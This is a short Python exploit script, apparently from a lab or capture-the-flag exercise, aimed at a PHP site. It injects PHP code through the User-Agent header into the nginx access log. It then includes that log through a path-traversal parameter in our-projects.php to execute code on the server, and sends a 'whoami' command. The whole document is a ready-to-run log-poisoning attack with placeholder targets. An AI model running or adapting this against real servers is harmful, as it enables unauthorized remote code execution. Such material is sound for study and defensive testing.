from requests import get

IP = '<TARGET_IP>'
PORT = '<TARGET_PORT>'

# Test payload for PHP execution
payload = 'phpinfo()'
php_payload = f"<?php {payload}; ?>"

headers = {
    'User-Agent': php_payload
}

get(f'http://{IP}:{PORT}/', headers=headers)
r = get(f'http://{IP}:{PORT}/our-projects.php?project=../../../../var/log/nginx/access.log', params={'cmd': 'whoami'})

print(r.text)
